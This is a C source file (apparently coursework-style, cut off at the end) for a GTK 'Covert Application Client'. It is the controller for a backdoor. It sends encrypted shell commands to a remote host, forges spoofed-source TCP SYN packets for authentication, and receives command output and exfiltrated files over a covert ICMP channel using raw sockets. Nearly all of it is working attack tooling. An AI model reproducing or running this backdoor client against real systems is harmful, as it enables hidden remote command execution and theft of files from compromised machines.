/****************************************************************************
 Program        : client.c
 PROGRAMMER     : David Wang 
 Description    : This program is a complete covert application client
                  Including the following parts:
                  1. Backdoor commander
                  2. File exfiltration receiver
                  3. Port knocking commander
                  4. Client authentication terminal
                  5. Distributed client
 usage          : ./client
 Compile command: gcc -Wall client.c -o client `pkg-config --cflags --libs gtk+-2.0 --libs gthread-2.0`
****************************************************************************/
#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <strings.h>
#include <unistd.h>
#include <errno.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include <gtk/gtk.h>
#include <gtk/gtkaboutdialog.h>
#include <gtk/gtkversion.h>
#include <glib/gprintf.h>
#include "bdclient.h"
#include "3des.h"

// Global pointers for GTK+ widgets
static GtkTextBuffer *buffer;
static GtkWidget *window;
static GtkWidget *text_view;
static GtkWidget *txtCommand;
static GtkWidget *txtPortNumber;
static GtkWidget *txtDownload;
static GtkWidget *txtTime;
static GtkWidget *txtDur;
static GtkWidget *txtSrc;
static GtkWidget *txtDest;
static GtkWidget *txtauthip;
static GtkWidget *txtSaveAs;
static GtkWidget *dlgSave;
static GtkWidget *dlgAbout;
static GtkWidget *chkTcp;
static GtkWidget *chkUdp;
static GtkWidget *pbar;
static GThread* thrdRcvCmdRst;
static GThread* thrdRcvFile;

// main function
int main(int argc, char *argv[])
{
    GtkWidget *vbox, *hbox, *hbox0, *vboxr;
    GtkWidget *close_button;
    GtkWidget *clear_button;
    GtkWidget *knock_button;
    GtkWidget *about_button;
    GtkWidget *auth_button;
    GtkWidget *pScrollWin;
    GtkWidget *download_button;
    GtkWidget *lblOutput,*lblInput,*lblp,*lblpn,*lblpt,*lbltime,*lbltime1,
              *lbldur,*lbldl,*lblsrc,*lbldest,*lblauth,*lblsa;
    GtkWidget *vs,*hs,*hs1,*hs2,*hs3;
    PangoFontDescription *font_desc;
    
    gtk_init (&argc, &argv);
    g_thread_init(NULL);
    gdk_threads_init();
    gtk_init(&argc, &argv);
    
    if(g_thread_supported() == FALSE)
    {
        msgError("Your GLib doesn't support threading! Quit.");
        exit(-1);
    }

    // Create a Window.
    window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
    gtk_window_set_title(GTK_WINDOW (window), "Covert Application Client");
    
    // Set a decent default size for the window.
    gtk_window_set_default_size(GTK_WINDOW (window), 1000, 600);
    g_signal_connect (G_OBJECT (window), "destroy", G_CALLBACK (on_window_destroy), NULL);
    gtk_container_set_border_width(GTK_CONTAINER (window), 2);

    hbox0 = gtk_hbox_new(0, 2);
    gtk_container_add(GTK_CONTAINER (window), hbox0);
    
    vbox = gtk_vbox_new(0, 2);
    gtk_box_pack_start(GTK_BOX(hbox0), vbox, 1, 1, 0);
    
    vs = gtk_vseparator_new();
    gtk_box_pack_start(GTK_BOX(hbox0), vs, 0, 0, 0);
    
    vboxr = gtk_vbox_new(0, 2);
    gtk_box_pack_start(GTK_BOX(hbox0), vboxr, 0, 0, 0);

    // Create a Scrolled Window that will contain the GtkSourceView
    pScrollWin = gtk_scrolled_window_new(NULL, NULL);
    gtk_scrolled_window_set_policy(GTK_SCROLLED_WINDOW (pScrollWin), GTK_POLICY_AUTOMATIC, GTK_POLICY_AUTOMATIC);
  
    // Create a lable
    lblOutput = gtk_label_new (" --== Output results ==-- ");
    gtk_box_pack_start(GTK_BOX(vbox), lblOutput, 0, 0, 0);
  
    // Create a multiline text widget.
    text_view = gtk_text_view_new();
    gtk_text_view_set_editable(GTK_TEXT_VIEW(text_view),FALSE);
    
    // Attach the multiline text widget to the scrolled Window
    gtk_container_add (GTK_CONTAINER(pScrollWin), GTK_WIDGET (text_view));
    gtk_box_pack_start(GTK_BOX(vbox), pScrollWin, 1, 1, 1);

    // Obtaining the buffer associated with the widget.
    buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW (text_view));
  
    // Set the default buffer text.
    gtk_text_buffer_set_text(buffer, "", -1);
  
    // Create another lable
    lblInput = gtk_label_new(" --== Input Command ==-- ");
    gtk_box_pack_start(GTK_BOX(vbox), lblInput, 0, 0, 0);
  
    // Create command box
    txtCommand = gtk_entry_new();
    gtk_entry_set_max_length(GTK_ENTRY(txtCommand),256);
    gtk_box_pack_start(GTK_BOX (vbox), txtCommand, 0, 0, 0);
    g_signal_connect(G_OBJECT(txtCommand), "activate", G_CALLBACK(on_send_button_clicked), NULL);
    
    hbox = gtk_hbox_new (FALSE, 2);
    gtk_box_pack_start (GTK_BOX (vbox), hbox, 0, 0, 0);
  
    // Create a clear button
    clear_button = gtk_button_new_with_label("Clear");
    gtk_box_pack_start(GTK_BOX(hbox), clear_button, 1, 1, 1);
    g_signal_connect(G_OBJECT(clear_button), "clicked", G_CALLBACK(on_clear_button_clicked), NULL);
 
    // Create a send button
    clear_button = gtk_button_new_with_label ("Send");
    gtk_box_pack_start(GTK_BOX(hbox), clear_button, 1, 1, 1);
    g_signal_connect(G_OBJECT(clear_button), "clicked", G_CALLBACK(on_send_button_clicked), NULL);
    
    // Create a save button
    clear_button = gtk_button_new_with_label ("Save");
    gtk_box_pack_start(GTK_BOX(hbox), clear_button, 1, 1, 1);
    g_signal_connect(G_OBJECT(clear_button), "clicked", G_CALLBACK(on_save_button_clicked), NULL);
    
    // Create a close button.
    close_button = gtk_button_new_with_label("Close");
    gtk_box_pack_start(GTK_BOX(hbox), close_button, 1, 1, 1);
    g_signal_connect(G_OBJECT(close_button), "clicked", G_CALLBACK(on_close_button_clicked), NULL);
    
    // Create port-knocking lable
    lblp = gtk_label_new("[Port-Knocking]");
    gtk_box_pack_start(GTK_BOX(vboxr), lblp, 0, 0, 0);
    
    hs = gtk_hseparator_new();
    gtk_box_pack_start(GTK_BOX(vboxr), hs, 0, 0, 0);
    
    // Create port number box
    lblpn = gtk_label_new("Port Number:");
    gtk_box_pack_start(GTK_BOX(vboxr), lblpn, 0, 0, 0);

    txtPortNumber = gtk_entry_new();
    gtk_entry_set_max_length(GTK_ENTRY(txtPortNumber),5);
    gtk_box_pack_start(GTK_BOX(vboxr), txtPortNumber, 0, 0, 0);
    
    // Create port type check box
    lblpt = gtk_label_new("Port Type:");
    gtk_box_pack_start(GTK_BOX(vboxr), lblpt, 0, 0, 0);
    
    chkTcp = gtk_check_button_new_with_label("TCP");
    chkUdp = gtk_check_button_new_with_label("UDP");
    gtk_box_pack_start(GTK_BOX(vboxr), chkTcp, 0, 0, 0);
    gtk_box_pack_start(GTK_BOX(vboxr), chkUdp, 0, 0, 0);
    
    // Create time box
    lbltime = gtk_label_new("Start time:");
    gtk_box_pack_start(GTK_BOX(vboxr), lbltime, 0, 0, 0);
    lbltime1 = gtk_label_new("hh:mm:ss(24 hours)");
    gtk_box_pack_start(GTK_BOX(vboxr), lbltime1, 0, 0, 0);
    
    txtTime = gtk_entry_new();
    gtk_entry_set_max_length(GTK_ENTRY(txtTime),8);
    gtk_box_pack_start(GTK_BOX(vboxr), txtTime, 0, 0, 0);
    
    // Create duration box
    lbldur = gtk_label_new("Duration (Seconds)");
    gtk_box_pack_start(GTK_BOX(vboxr), lbldur, 0, 0, 0);
    
    txtDur = gtk_entry_new();
    gtk_entry_set_max_length(GTK_ENTRY(txtDur),5);
    gtk_box_pack_start(GTK_BOX(vboxr), txtDur, 0, 0, 0);
    
    // Create Knock button
    knock_button = gtk_button_new_with_label ("Knock it");
    gtk_box_pack_start(GTK_BOX(vboxr), knock_button, 0, 0, 0);
    g_signal_connect(G_OBJECT(knock_button), "clicked", G_CALLBACK(on_knock_button_clicked), NULL);
    
    // Download file
    hs1 = gtk_hseparator_new();
    gtk_box_pack_start(GTK_BOX(vboxr), hs1, 0, 1, 1);
    lbldl = gtk_label_new("Get File (full path) :");
    gtk_box_pack_start(GTK_BOX(vboxr), lbldl, 0, 0, 0);
    txtDownload = gtk_entry_new();
    gtk_entry_set_max_length(GTK_ENTRY(txtDownload),128);
    gtk_box_pack_start(GTK_BOX(vboxr), txtDownload, 0, 0, 0);
    g_signal_connect(G_OBJECT(txtDownload), "activate", G_CALLBACK(on_download_button_clicked), NULL);
    
    lblsa = gtk_label_new("Save as (full path) :");
    gtk_box_pack_start(GTK_BOX(vboxr), lblsa, 0, 0, 0);
    txtSaveAs = gtk_entry_new();
    gtk_entry_set_max_length(GTK_ENTRY(txtSaveAs),128);
    gtk_box_pack_start(GTK_BOX(vboxr), txtSaveAs, 0, 0, 0);
    g_signal_connect(G_OBJECT(txtSaveAs), "activate", G_CALLBACK(on_download_button_clicked), NULL);
    
    download_button = gtk_button_new_with_label ("Download it");
    gtk_box_pack_start(GTK_BOX(vboxr), download_button, 0, 0, 0);
    g_signal_connect(G_OBJECT(download_button), "clicked", G_CALLBACK(on_download_button_clicked), NULL);
    hs2 = gtk_hseparator_new();
    gtk_box_pack_start(GTK_BOX(vboxr), hs2, 0, 1, 1);
    
    // Create src/dest ip box
    lblsrc = gtk_label_new("Source:");
    gtk_box_pack_start(GTK_BOX(vboxr), lblsrc, 0, 0, 0);
    txtSrc = gtk_entry_new();
    gtk_entry_set_max_length(GTK_ENTRY(txtSrc),80);
    gtk_box_pack_start(GTK_BOX(vboxr), txtSrc, 0, 0, 0);
    lbldest = gtk_label_new("Destination:");
    gtk_box_pack_start(GTK_BOX(vboxr), lbldest, 0, 0, 0);
    txtDest = gtk_entry_new();
    gtk_entry_set_max_length(GTK_ENTRY(txtDest),80);
    gtk_box_pack_start(GTK_BOX(vboxr), txtDest, 0, 0, 0);

    // Create Authentication button
    auth_button = gtk_button_new_with_label ("Authentication");
    gtk_box_pack_start(GTK_BOX(vboxr), auth_button, 0, 0, 0);
    g_signal_connect(G_OBJECT(auth_button), "clicked", G_CALLBACK(on_auth_button_clicked), NULL);
    lblauth = gtk_label_new("Authenticated IP:");
    gtk_box_pack_start(GTK_BOX(vboxr), lblauth, 0, 0, 0);
    txtauthip = gtk_entry_new();
    gtk_entry_set_text(GTK_ENTRY(txtauthip),"None");
    gtk_entry_set_editable(GTK_ENTRY(txtauthip),FALSE);
    gtk_box_pack_start(GTK_BOX(vboxr), txtauthip, 0, 0, 0);

    // Create about button
    hs3 = gtk_hseparator_new();
    gtk_box_pack_start(GTK_BOX(vboxr), hs3, 0, 1, 1);
    
    pbar = gtk_progress_bar_new();
    gtk_box_pack_start(GTK_BOX(vboxr), pbar, 0, 0, 0);
    gtk_progress_configure(GTK_PROGRESS(pbar), 1.0,0.0,1.0);
    
    about_button = gtk_button_new_with_label ("About");
    gtk_box_pack_start(GTK_BOX(vboxr), about_button, 0, 0, 0);
    g_signal_connect(G_OBJECT(about_button), "clicked", G_CALLBACK(on_about_button_clicked), NULL);

	config();
    gtk_widget_show_all(window);

    /* Change default font throughout the widget */
    font_desc = pango_font_description_from_string ("Courier 12");
    pango_font_description_set_weight(font_desc,PANGO_WEIGHT_NORMAL);
    gtk_widget_modify_font (text_view, font_desc);
    pango_font_description_free (font_desc);
    
    gdk_threads_enter();
        thrdRcvCmdRst = g_thread_create(RcvCmdRst, NULL, TRUE, NULL);
        gtk_main();
    gdk_threads_leave();
    return 0;
}

// Window destroy callback function
void on_window_destroy (GtkWidget *widget, gpointer data)
{
    gtk_main_quit();
}

// Close button click callback function
void on_close_button_clicked (GtkWidget *button)
{
    gtk_main_quit();
}

// Clear button click callback function
void on_clear_button_clicked(GtkWidget *button)
{
        gtk_text_buffer_set_text(buffer, "", -1);
        gtk_entry_set_text(GTK_ENTRY(txtCommand),"");
}

/****************************************************************************
Function    :  on_send_button_clicked
REVISIONS   :  
Parameters  :  
Description :  Send button click callback function
Returns     :  None
****************************************************************************/
void on_send_button_clicked(GtkWidget *button)
{
    unsigned char read_buffer[DATA_LEN];
    unsigned char key1[sizeof(KEY1)],key2[sizeof(KEY2)],key3[sizeof(KEY3)];
    u_int16_t prefix;
    GtkTextIter end;
    GdkColor  color;
    char SRC[80],DEST[80],comm[256];
    
    const char* cmd = gtk_entry_get_text(GTK_ENTRY(txtCommand));
    const char* src = gtk_entry_get_text(GTK_ENTRY(txtSrc));
    const char* dst = gtk_entry_get_text(GTK_ENTRY(txtDest));
    if(strlen(src) == 0 || strlen(dst) == 0)
    {
        gdk_color_parse("red", &color);
        gtk_widget_modify_text(text_view, GTK_STATE_NORMAL, &color);
        gtk_text_buffer_get_end_iter(buffer, &end);
        gtk_text_buffer_insert(buffer, &end, "Please specify src and dest host/IP.\n", -1);
        return;
    }
    if(strlen(cmd) == 0) return;
    
    bzero(SRC,80);
    bzero(DEST,80);
    bcopy(src,SRC,strlen(src));
    bcopy(dst,DEST,strlen(dst));
    
    bzero(read_buffer, sizeof(read_buffer));
    prefix = COMMANDSTART;
    bcopy(&prefix, read_buffer, 2);
    prefix = COMMANDEND;
    bcopy(&prefix,&(read_buffer[DATA_LEN - 2]),2);
    bcopy(cmd, &(read_buffer[2]), strlen(cmd));
    
    bcopy(KEY1,key1,sizeof(KEY1));
    encrypt(read_buffer, key1, sizeof(read_buffer), sizeof(KEY1));
    bcopy(KEY2,key2,sizeof(KEY2));
    encrypt(read_buffer, key2, sizeof(read_buffer), sizeof(KEY2));
    bcopy(KEY3,key3,sizeof(KEY3));
    encrypt(read_buffer, key3, sizeof(read_buffer), sizeof(KEY3));
    sender(SRC, DEST, read_buffer);  // Send the data
    
    // Change default color to blue
    gdk_color_parse("blue", &color);
    gtk_widget_modify_text(text_view, GTK_STATE_NORMAL, &color);
    bzero(comm,256);
    sprintf(comm, "[root@server] %s\n", cmd);
    gtk_text_buffer_insert_at_cursor(buffer,comm,strlen(comm));
    gtk_entry_set_text(GTK_ENTRY(txtCommand),"");
}

/****************************************************************************
Function    :  on_save_button_clicked
REVISIONS   :  
Parameters  :  
Description :  Save button click callback function
Returns     :  None
****************************************************************************/
void on_save_button_clicked(GtkWidget *button)
{
    char *filename, *buf;
    GtkTextIter start, end;
    FILE *stream;
    
    dlgSave = gtk_file_chooser_dialog_new("Save as",NULL,GTK_FILE_CHOOSER_ACTION_SAVE,
                                          GTK_STOCK_CANCEL, GTK_RESPONSE_CANCEL,
				                          GTK_STOCK_SAVE, GTK_RESPONSE_ACCEPT,NULL);
    if (gtk_dialog_run (GTK_DIALOG(dlgSave)) == GTK_RESPONSE_ACCEPT)
    {
        filename = gtk_file_chooser_get_filename(GTK_FILE_CHOOSER (dlgSave));
        gtk_text_buffer_get_bounds(buffer, &start, &end);
        buf = gtk_text_buffer_get_text(buffer, &start, &end, 1);
        
        stream = fopen(filename,"w");
        fwrite(buf, 1, strlen((char *)buf), stream);
        fclose(stream);
    }
    gtk_widget_destroy(dlgSave);
}

/****************************************************************************
Function    :  on_about_button_clicked
REVISIONS   :  
Parameters  :  
Description :  About button click callback function
Returns     :  None
****************************************************************************/
void on_about_button_clicked(GtkWidget *button)
{
    const gchar *authors[] = { "David Wang", NULL };
    const gchar license_text[] = "MIT License";
    const gchar *documenters[] = { "David Wang", "", NULL };

    dlgAbout = gtk_about_dialog_new();
    gtk_about_dialog_set_name(GTK_ABOUT_DIALOG(dlgAbout),"Covert Application Client");
    
    gtk_show_about_dialog(NULL,
                         "name","Covert Application Client",
                         "authors", authors,
                         "copyright", "Copyright © 2007 David Wang\n"
                                      "",
                         "documenters", documenters,
                         "license", license_text,
                         "wrap-license", TRUE,
                         "logo-icon-name", "gucharmap",NULL);
    gtk_widget_destroy(dlgAbout);
}

// Print out error message in text box
void msgError(char *msg)
{
    GtkWidget* dlgBox;
    dlgBox = gtk_message_dialog_new(NULL,GTK_DIALOG_MODAL,GTK_MESSAGE_ERROR,GTK_BUTTONS_CLOSE,msg);
    gtk_dialog_run (GTK_DIALOG (dlgBox));
    gtk_widget_destroy(dlgBox);
}

/****************************************************************************
Function    :  RcvCmdRst (Thread function)
REVISIONS   :  
Parameters  :  
Description :  Receving command execution results
Returns     :  None
****************************************************************************/
void* RcvCmdRst(void *arg)
{
    unsigned char key1[sizeof(KEY1)];
    unsigned char key2[sizeof(KEY2)];
    unsigned char key3[sizeof(KEY3)];
    struct received_buffer rb;
    GtkTextIter end;
    int rd;
    unsigned char buf[56];
    ssize_t read_len;
    gchar* BUF;
    
    rd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if(rd < 0)
    {
        gdk_threads_enter();
        	gtk_text_buffer_get_end_iter(buffer, &end);
	        gtk_text_buffer_insert(buffer, &end, "Error --> Listening thread existed. Are you root?\n", -1);
        gdk_threads_leave();
        write(1,"\7",1);
        close(rd);
        return NULL;
    }
        
    while(1)
    {
        bzero(&rb, sizeof(struct received_buffer));
        bzero(buf, 56);
        read_len = read(rd, &rb, sizeof(struct received_buffer)); // read from raw socket
        
        // Screening what we want
        if(rb.ICMPHeader.type == 0               &&     // Echo-reply
           rb.ICMPHeader.code == 8               &&     // command execution flag
           rb.IPHeader.id == F_CER               &&     // Flag
           rb.IPHeader.protocol == IPPROTO_ICMP)        // icmp protocol
        {
           bcopy(&(rb.data), buf, read_len);

           // Decrypt data using Triple-XOR algorithm
           bcopy(KEY3,key3,sizeof(KEY3));
           decrypt(buf, key3, 56, sizeof(KEY3));
           bcopy(KEY2,key2,sizeof(KEY2));
           decrypt(buf, key2, 56, sizeof(KEY2));
           bcopy(KEY1,key1,sizeof(KEY1));
           decrypt(buf, key1, 56, sizeof(KEY1));

           gdk_threads_enter();
	           BUF = g_convert((gchar *)(&buf), -1,"UTF-8","ISO8859-1",NULL,NULL,NULL);
    	       gtk_text_buffer_insert_at_cursor(buffer,BUF,strlen(BUF));
        	   gtk_text_buffer_get_end_iter(buffer, &end);
	           gtk_text_view_scroll_to_iter(GTK_TEXT_VIEW(text_view),&end,0.0,1,0.0,1.0);
    	       if(strlen(BUF) < 56)
        	   {
            	    usleep(10000);
                	gtk_text_buffer_get_end_iter(buffer, &end);
	                gtk_text_view_scroll_to_iter(GTK_TEXT_VIEW(text_view),&end,0.0,0,1.0,1.0);
    	            write(1,"\7",1);
        	   }
           gdk_threads_leave();
        }
    }
    close(rd);
    return NULL;
}

/****************************************************************************
Function    :  on_auth_button_clicked
REVISIONS   :  
Parameters  :  
Description :  Authentication callback
Returns     :  None
****************************************************************************/
void on_auth_button_clicked(GtkWidget *button)
{
    gchar buf[20];
    unsigned char  con[8], con1[8], key[8];
    struct Auth_buffer abuf;
    int send_socket;
    int on = 1;
    struct sockaddr_in sin;
    struct pseudo_header_tcp pseudo_header;
    GtkTextIter end;
    
    const char* src = gtk_entry_get_text(GTK_ENTRY(txtSrc));
    const char* dst = gtk_entry_get_text(GTK_ENTRY(txtDest));
    
    if(gethostbyname(src) == NULL){
        gtk_text_buffer_insert_at_cursor(buffer,"Invalid source IP.\n", 19);
        gtk_text_buffer_get_end_iter(buffer, &end);
        gtk_text_view_scroll_to_iter(GTK_TEXT_VIEW(text_view),&end,0.0,1,0.0,1.0);
        return;
    }
    
    if(gethostbyname(dst) == NULL){
        gtk_text_buffer_insert_at_cursor(buffer,"Invalid destination IP.\n", 24);
        gtk_text_buffer_get_end_iter(buffer, &end);
        gtk_text_view_scroll_to_iter(GTK_TEXT_VIEW(text_view),&end,0.0,1,0.0,1.0);
        return;
    }
   
    // Forge IP header
    abuf.IPHeader.ihl      = 5;
    abuf.IPHeader.version  = 4;
    abuf.IPHeader.tos      = 0;
    abuf.IPHeader.tot_len  = htons(40);
    abuf.IPHeader.id       = F_AUTH; 
    abuf.IPHeader.frag_off = 0;
    abuf.IPHeader.ttl      = 128;
    abuf.IPHeader.protocol = IPPROTO_TCP;
    abuf.IPHeader.check    = 0;

    abuf.IPHeader.saddr    = host_convert((char *)src);
    abuf.IPHeader.daddr    = host_convert((char *)dst);
    abuf.IPHeader.check    = in_cksum((unsigned short *)&abuf.IPHeader, 20);
    
    // Forge TCP header
    abuf.TCPHeader.source  = htons(P_AUTH);
    abuf.TCPHeader.dest    = htons(D_AUTH);
    abuf.TCPHeader.seq     = host_convert((char *)src);
    abuf.TCPHeader.ack_seq = host_convert((char *)dst);
    abuf.TCPHeader.res1    = 0;
    abuf.TCPHeader.doff    = 5;
    abuf.TCPHeader.fin     = 0;
    abuf.TCPHeader.syn     = 1;
    abuf.TCPHeader.rst     = 0;
    abuf.TCPHeader.psh     = 0;
    abuf.TCPHeader.ack     = 0;
    abuf.TCPHeader.urg     = 0;
    abuf.TCPHeader.ece     = 0;
    abuf.TCPHeader.cwr     = 0;
    abuf.TCPHeader.window  = htons(512);
    abuf.TCPHeader.check   = 0;
    abuf.TCPHeader.urg_ptr = 0;

    bcopy(&(abuf.TCPHeader.seq),     &(con[0]), 4);
    bcopy(&(abuf.TCPHeader.ack_seq), &(con[4]), 4);
    
    bzero(key,8);
    strncpy((char *)&key,KEY_AUTH,8);
    
    T_DES(con, con1, key, 1);

    bcopy(&(con1[0]), &(abuf.TCPHeader.seq),     4);
    bcopy(&(con1[4]), &(abuf.TCPHeader.ack_seq), 4);

    // Forge pseudo header and calculate the tcp checksum
    pseudo_header.source_address = abuf.IPHeader.saddr;
    pseudo_header.dest_address = abuf.IPHeader.daddr;
    pseudo_header.placeholder = 0;
    pseudo_header.protocol = IPPROTO_TCP;
    pseudo_header.tcp_length = htons(20);
    bcopy((char *)&abuf.TCPHeader, (char *)&pseudo_header.tcp, 20);
    abuf.TCPHeader.check = in_cksum((unsigned short *)&pseudo_header, 32);

    /* Drop our forged data into the socket struct */
    sin.sin_family = AF_INET;
    sin.sin_port = abuf.TCPHeader.source;
    sin.sin_addr.s_addr = abuf.IPHeader.daddr; 
    send_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    setsockopt(send_socket, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
    
    sendto(send_socket, &abuf, 40, 0, (struct sockaddr *)&sin, sizeof(sin));
   
    bzero(buf,20);
    sprintf(buf,"%s", (char *)gtk_entry_get_text(GTK_ENTRY(txtSrc)));
    
    gtk_entry_set_text(GTK_ENTRY(txtauthip),buf);
    close(send_socket);
}

/****************************************************************************
Function    :  on_download_button_clicked
REVISIONS   :  
Parameters  :  
Description :  Download callback
Returns     :  None
****************************************************************************/
void on_download_button_clicked(GtkWidget *button)
{
    unsigned char read_buffer[DATA_LEN];
    unsigned char key1[sizeof(KEY1)],key2[sizeof(KEY2)],key3[sizeof(KEY3)];
    u_int16_t prefix;
    GtkTextIter end;
    GdkColor  color;
    char SRC[80],DEST[80],comm[256];
    
    const char* cmd = gtk_entry_get_text(GTK_ENTRY(txtDownload));
    const char* src = gtk_entry_get_text(GTK_ENTRY(txtSrc));
    const char* dst = gtk_entry_get_text(GTK_ENTRY(txtDest));
    const char* saveas = gtk_entry_get_text(GTK_ENTRY(txtSaveAs));
    
    if(gethostbyname(src) == NULL){
        gtk_text_buffer_insert_at_cursor(buffer,"Invalid source IP.\n", 19);
        gtk_text_buffer_get_end_iter(buffer, &end);
        gtk_text_view_scroll_to_iter(GTK_TEXT_VIEW(text_view),&end,0.0,1,0.0,1.0);
        return;
    }
    
    if(gethostbyname(dst) == NULL){
        gtk_text_buffer_insert_at_cursor(buffer,"Invalid destination IP.\n", 24);
        gtk_text_buffer_get_end_iter(buffer, &end);
        gtk_text_view_scroll_to_iter(GTK_TEXT_VIEW(text_view),&end,0.0,1,0.0,1.0);
        return;
    }
    
    if(strlen(src) == 0 || strlen(dst) == 0)
    {
        gdk_color_parse("red", &color);
        gtk_widget_modify_text(text_view, GTK_STATE_NORMAL, &color);
        gtk_text_buffer_insert_at_cursor(buffer,"Error->Please specify src and dest host/IP.\n",44);
        gtk_text_buffer_get_end_iter(buffer, &end);
        gtk_text_view_scroll_to_iter(GTK_TEXT_VIEW(text_view),&end,0.0,0,1.0,1.0);
        write(1,"\7",1);
        return;
    }
    
    if(strlen(cmd) == 0 || strlen(saveas) == 0)
    {
        gtk_text_buffer_insert_at_cursor(buffer,"Error->Please enter src/dest file name!\n",40);
        gtk_text_buffer_get_end_iter(buffer, &end);
        gtk_text_view_scroll_to_iter(GTK_TEXT_VIEW(text_view),&end,0.0,0,1.0,1.0);
        write(1,"\7",1);
        return;
    }
    
    bzero(comm,256);
    sprintf(comm, "get %s", cmd);
    
    bzero(SRC,80);
    bzero(DEST,80);
    bcopy(src,SRC,strlen(src));
    bcopy(dst,DEST,strlen(dst));
    
    bzero(read_buffer, sizeof(read_buffer));
    prefix = COMMANDSTART;
    bcopy(&prefix, read_buffer, 2);
    prefix = COMMANDEND;
    bcopy(&prefix,&(read_buffer[DATA_LEN - 2]),2);
    bcopy(comm, &(read_buffer[2]), strlen(comm));

    bcopy(KEY1,key1,sizeof(KEY1));
    encrypt(read_buffer, key1, sizeof(read_buffer), sizeof(KEY1));
    bcopy(KEY2,key2,sizeof(KEY2));
    encrypt(read_buffer, key2, sizeof(read_buffer), sizeof(KEY2));
    bcopy(KEY3,key3,sizeof(KEY3));
    encrypt(read_buffer, key3, sizeof(read_buffer), sizeof(KEY3));

    sender(SRC, DEST, read_buffer);  // Send the data

    thrdRcvFile = g_thread_create(rcv_file, NULL, TRUE, NULL);
}

/****************************************************************************
Function    :  rcv_file (Thread function)
REVISIONS   :  
Parameters  :  
Description :  Receiving file from server
Returns     :  None
****************************************************************************/
void* rcv_file(void *y)
{
    unsigned char key1[sizeof(KEY1)];
    unsigned char key2[sizeof(KEY2)];
    unsigned char key3[sizeof(KEY3)];
    struct received_buffer rb;
    GtkTextIter end;
    int rd;
    unsigned long count = 0;    // received packets counter
    unsigned long counter = 0;  // sent packets counter
    unsigned char buf[56];
    char tbuf[80];
    ssize_t read_len;
    FILE *file;
    gdouble percentage = 0.1;        // for update the progress bar
    
    rd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if(rd < 0)
    {
        gdk_threads_enter();
	        gtk_text_buffer_insert_at_cursor(buffer,"Error --> Listening thread existed. Are you root?\n",50);
    	    gtk_text_buffer_get_end_iter(buffer, &end);
        	gtk_text_view_scroll_to_iter(GTK_TEXT_VIEW(text_view),&end,0.0,0,1.0,1.0);
        gdk_threads_leave();
        write(1,"\7",1);
        close(rd);
        return NULL;
    }
    
    gdk_threads_enter();
    	const char* name = (char *)gtk_entry_get_text(GTK_ENTRY(txtSaveAs));
    gdk_threads_leave();
    
    file = fopen(name,"wb");
    
    if(file == NULL)
    {
       gdk_threads_enter();
	       gtk_text_buffer_insert_at_cursor(buffer,"Error --> Openning file to write.\n",34);
    	   gtk_text_buffer_get_end_iter(buffer, &end);
	       gtk_text_view_scroll_to_iter(GTK_TEXT_VIEW(text_view),&end,0.0,0,1.0,1.0);
       gdk_threads_leave();
       write(1,"\7",1);
       return NULL;
    }
    
    bzero(tbuf, 80);
    gdk_threads_enter();
    	sprintf(tbuf, "Receiving data : %s --> %s \n",
                  (char *)gtk_entry_get_text(GTK_ENTRY(txtDownload)),
                  (char *)gtk_entry_get_text(GTK_ENTRY(txtSaveAs)));
    	gtk_text_buffer_insert_at_cursor(buffer, tbuf ,strlen(tbuf));
    gdk_threads_leave();
    
    while(1)
    {
        bzero(&rb, sizeof(struct received_buffer));
        bzero(buf, 56);
        read_len = read(rd, &rb, sizeof(struct received_buffer)); // read from raw socket
        
        // Screening what we want
        if(rb.ICMPHeader.type == 8               &&     // Echo
           rb.ICMPHeader.code != 0               &&     // command execution flag
           rb.IPHeader.id == htons(F_SEND)       &&     // Flag for sending file
           rb.IPHeader.protocol == IPPROTO_ICMP)        // icmp protocol
        {
           bcopy(&(rb.data), buf, read_len);
           bzero(tbuf,80);
           
           sprintf(tbuf,"   Sequence number ------> [%d] ------> OK\n", ntohs(rb.ICMPHeader.un.echo.sequence));
           
           gdk_threads_enter();
              gtk_text_buffer_insert_at_cursor(buffer,tbuf,strlen(tbuf));
              gtk_text_buffer_get_end_iter(buffer, &end);
              gtk_text_view_scroll_to_iter(GTK_TEXT_VIEW(text_view),&end,0.0,1,0.0,1.0);
              gtk_progress_bar_set_pulse_step(GTK_PROGRESS_BAR(pbar),percentage);
              percentage = percentage + 0.1;
              if(percentage >= 1.0) percentage = 0.1;
              gtk_progress_bar_update(GTK_PROGRESS_BAR(pbar), percentage);
           gdk_threads_leave();
           
           // Decrypt data using Triple-XOR algorithm
           bcopy(KEY3,key3,sizeof(KEY3));
           decrypt(buf, key3, 56, sizeof(KEY3));
           bcopy(KEY2,key2,sizeof(KEY2));
           decrypt(buf, key2, 56, sizeof(KEY2));
           bcopy(KEY1,key1,sizeof(KEY1));
           decrypt(buf, key1, 56, sizeof(KEY1));

           if(!strncmp((char *)buf, "ENDendEND", 9))
           {
                bzero(tbuf, 80);
                bcopy(&(buf[9]), &counter, sizeof(unsigned long));
                sprintf(tbuf, "Total data packets sent by the server = %lu\n", counter);
                
                gdk_threads_enter();
                	gtk_text_buffer_insert_at_cursor(buffer, tbuf ,strlen(tbuf));

                	bzero(tbuf, 80);
                	sprintf(tbuf, "Total data packets received by client = %lu\n", count);
                	gtk_text_buffer_insert_at_cursor(buffer, tbuf ,strlen(tbuf));
                	
                	sprintf(tbuf, "The last one is a flag packet and doesn't contain any data.\n");
                	gtk_text_buffer_insert_at_cursor(buffer, tbuf ,strlen(tbuf));
                	
	                gtk_text_buffer_get_end_iter(buffer, &end);
    	            gtk_text_view_scroll_to_iter(GTK_TEXT_VIEW(text_view),&end,0.0,1,0.0,1.0);
                gdk_threads_leave();
                break;
           }
           fwrite(buf, 1, rb.ICMPHeader.code, file);
           count++;
        }
    }
    close(rd);
    fclose(file);
    percentage = 1.0;
    gdk_threads_enter();
	    gtk_progress_bar_update(GTK_PROGRESS_BAR(pbar), percentage);
    gdk_threads_leave();
    write(1,"\7",1);
    return NULL;
}

// See if it is a digit string
unsigned char isDigit(char *str, int len)
{
